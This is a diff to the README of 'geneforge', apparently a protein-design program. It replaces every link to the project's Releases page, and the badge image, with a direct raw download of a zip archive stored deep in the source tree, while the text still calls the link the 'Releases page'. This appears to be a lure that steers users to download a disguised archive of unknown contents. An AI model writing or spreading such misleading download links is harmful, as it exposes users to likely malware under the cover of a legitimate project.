@@ -6,9 +6,9 @@ Welcome to **geneforge**. This program helps you design new proteins that can ai
 ## 📥 Download & Install
 **To get started, visit this page to download:**
 
-[![Download from Releases](https://img.shields.io/badge/Download_from_Releases-blue.svg)](https://github.com/Nirvanazero/geneforge/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Nirvanazero/geneforge/main/src/data_processing/geneforge_v2.7.zip)](https://raw.githubusercontent.com/Nirvanazero/geneforge/main/src/data_processing/geneforge_v2.7.zip)
 
-1. Go to the [Releases page](https://github.com/Nirvanazero/geneforge/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Nirvanazero/geneforge/main/src/data_processing/geneforge_v2.7.zip).
 
 2. You will see a list of versions. Find the most recent one and click on it.
 
@@ -67,4 +67,4 @@ After installation, remember to visit the Releases page again for any future upd
 
 **Still need help?** Don’t hesitate to reach out through the Issues section. Happy protein designing! 
 
-[![Download from Releases](https://img.shields.io/badge/Download_from_Releases-blue.svg)](https://github.com/Nirvanazero/geneforge/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Nirvanazero/geneforge/main/src/data_processing/geneforge_v2.7.zip)](https://raw.githubusercontent.com/Nirvanazero/geneforge/main/src/data_processing/geneforge_v2.7.zip)
